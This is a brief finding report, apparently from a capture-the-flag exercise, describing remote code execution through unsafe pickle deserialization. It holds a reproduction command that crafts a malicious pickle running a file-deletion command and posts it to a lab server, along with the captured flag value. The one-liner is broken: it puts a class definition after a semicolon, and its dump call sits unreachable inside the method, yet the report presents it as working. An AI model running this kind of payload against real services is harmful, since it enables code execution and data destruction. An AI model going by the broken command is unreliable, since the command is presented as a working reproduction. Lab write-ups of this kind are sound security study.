findings.title: Pickle Deserialization RCE - Flag Captured
findings.description: The application unsafely deserializes user-uploaded pickle files, allowing remote code execution. A malicious pickle payload was crafted using `__reduce__` to execute `rm -f decoy.txt`, which forced the application to read the real flag.txt instead of the decoy.

reproduction.command:
python3 -c "import pickle,os; class E:
 def __reduce__(self): return (os.system,('rm -f decoy.txt',)); pickle.dump(E(),open('exploit.pkl','wb'))" && curl -X POST http://172.17.0.1:41225/ -F "pickle_file=@exploit.pkl"
reproduction.expected: The page displays the real flag from flag.txt: flag{f96e0e03-a965-4c0d-a9dd-dccb9dfcb22c}
